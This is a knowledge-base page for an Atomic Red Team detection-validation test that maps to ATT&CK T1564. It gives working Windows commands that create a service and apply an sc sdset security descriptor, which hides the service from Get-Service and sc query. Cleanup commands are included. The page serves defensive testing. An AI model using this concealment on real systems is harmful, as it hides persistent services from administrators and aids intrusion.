---
atomic_guid: "333c7de0-6fbe-42aa-ac2b-c7e40b18246a"
title: "Create and Hide a Service with sc.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1564"
attack_technique_name: "Hide Artifacts"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564/T1564.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "333c7de0-6fbe-42aa-ac2b-c7e40b18246a"
  - "Create and Hide a Service with sc.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Create and Hide a Service with sc.exe

The following technique utilizes sc.exe and sdset to change the security descriptor of a service and "hide" it from Get-Service or sc query.

Upon successful execution, sc.exe creates a new service changes the security descriptor.

https://twitter.com/Alh4zr3d/status/1580925761996828672
https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format

## Metadata

- Atomic GUID: 333c7de0-6fbe-42aa-ac2b-c7e40b18246a
- Technique: T1564: Hide Artifacts
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1564/T1564.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1564-hide_artifacts|T1564]]

## Input Arguments

### executable_command

- description: Command to execute as a service
- type: string
- default: C:\Windows\System32\calc.exe

### service_name

- description: Name of service to create
- type: string
- default: AtomicService

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
sc.exe create #{service_name} binPath= "#{executable_command}"
sc sdset #{service_name} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

### Cleanup

```commandprompt
sc sdset #{service_name} "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
sc.exe delete #{service_name}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564/T1564.yaml)
